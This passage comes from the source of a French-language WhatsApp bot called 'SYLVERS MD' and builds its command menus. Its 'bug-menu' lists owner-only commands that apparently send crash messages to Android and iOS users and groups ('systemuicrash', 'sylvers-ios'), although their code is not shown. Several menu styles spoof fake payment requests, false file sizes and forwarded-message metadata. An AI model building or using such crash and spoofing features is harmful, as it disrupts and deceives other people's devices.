                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-database': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Database* 」✣──╮
│${setv} ╭──────────╮
│${setv} │${prefix}mod-cmd 🅟
│${setv} │${prefix}supp-cmd 🅟
│${setv} │${prefix}liste-cmd 🅡
│${setv} │${prefix}bloquer-cmd 🅟
│${setv} │${prefix}add-msg 🅟
│${setv} │${prefix}del-msg 🅟
│${setv} │${prefix}get-msg 🅡
│${setv} │${prefix}list-msg 🅡
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'bug-menu': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣──╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰────── ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Bug Menu* 」✣ ───╮
│${setv} ╭───────────╮
│${setv} │${prefix}sylvers-droid 🅟
│${setv} │${prefix}sylvers-droid2 🅟
│${setv} │${prefix}sylvers-ios 🅟
│${setv} │${prefix}sylvers-ios2 🅟
│${setv} │${prefix}systemuicrash 🅟
│${setv} │${prefix}kamusari 🅟
│${setv} │${prefix}neidy 🅟
│${setv} │${prefix}sylvers-ios3 ??
│${setv} │${prefix}sylvers-all 🅟
│${setv} │${prefix}kenv 🅟
│${setv} │${prefix}sylvers-buggroupe 🅟
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-divers': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰─────── ${readmore}
╭───✣「 *GUIDE* 」✣──╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭───✣「 *Divers* 」✣──╮
│${setv} ╭─────────╮
│${setv} │${prefix}update 🅡
│${setv} │${prefix}ping 🅡
│${setv} │${prefix}menu 🅡
│${setv} │${prefix}mon-ip 🅡
│${setv} │${prefix}repo 🅡
│${setv} │${prefix}requete 🅡
│${setv} │${prefix}id-groupe 🅡
│${setv} │${prefix}proprio 🅡
│${setv} │${prefix}rent-bot 🅡
│${setv} │${prefix}don 🅡
│${setv} │${prefix}temps-actif 🅡
│${setv} │${prefix}confession 🅡
│${setv} │${prefix}react 🅡
│${setv} │${prefix}q 🅡
│${setv} │${prefix}inspection 🅡
│${setv} │${prefix}tag-moi 🅡
│${setv} │${prefix}bible 🅡
│${setv} │${prefix}quran 🅡
│${setv} │${prefix}gita 🅡
│${setv} │${prefix}liste 🅡
│${setv} │${prefix}store 🅡
│${setv} │${prefix}shop 🅡
│${setv} │${prefix}add-liste 🅟
│${setv} │${prefix}supp-liste 🅟
│${setv} │${prefix}tiktok-stalk 🅡
│${setv} │${prefix}ml-stalk 🅡
│${setv} │${prefix}npm-stalk 🅡
│${setv} │${prefix}gh-stalk 🅡
│${setv} ╰──────────╯
╰──────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
